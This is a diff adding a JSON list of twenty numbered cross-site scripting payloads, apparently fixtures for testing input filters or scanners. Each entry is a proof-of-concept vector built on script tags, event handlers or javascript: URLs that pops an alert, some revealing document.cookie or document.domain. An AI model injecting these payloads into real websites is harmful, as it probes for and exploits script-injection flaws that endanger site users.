@@ -1,0 +1,23 @@
+[
+  { "id": "XSS_1", "payload": "<script>alert(1)</script>" },
+  { "id": "XSS_2", "payload": "<img src=x onerror=alert(1)>" },
+  { "id": "XSS_3", "payload": "<svg onload=alert(1)>" },
+  { "id": "XSS_4", "payload": "<body onload=alert(1)>" },
+  { "id": "XSS_5", "payload": "<iframe src=javascript:alert(1)></iframe>" },
+  { "id": "XSS_6", "payload": "<details open ontoggle=alert(1)>" },
+  { "id": "XSS_7", "payload": "<input autofocus onfocus=alert(1)>" },
+  { "id": "XSS_8", "payload": "<marquee onstart=alert(1)>" },
+  { "id": "XSS_9", "payload": "<video><source onerror=alert(1)></video>" },
+  { "id": "XSS_10", "payload": "<audio src=x onerror=alert(1)>" },
+
+  { "id": "XSS_11", "payload": "<svg><script>alert(1)</script></svg>" },
+  { "id": "XSS_12", "payload": "<img src=1 onerror=confirm(1)>" },
+  { "id": "XSS_13", "payload": "<script>prompt(1)</script>" },
+  { "id": "XSS_14", "payload": "<object data=javascript:alert(1)></object>" },
+  { "id": "XSS_15", "payload": "<embed src=javascript:alert(1)>" },
+  { "id": "XSS_16", "payload": "<math><mtext></mtext><script>alert(1)</script></math>" },
+  { "id": "XSS_17", "payload": "<img src=x onerror=alert(document.domain)>" },
+  { "id": "XSS_18", "payload": "<script>alert(document.cookie)</script>" },
+  { "id": "XSS_19", "payload": "<iframe srcdoc='<script>alert(1)</script>'></iframe>" },
+  { "id": "XSS_20", "payload": "<svg><animate onbegin=alert(1) /></svg>" }
+]
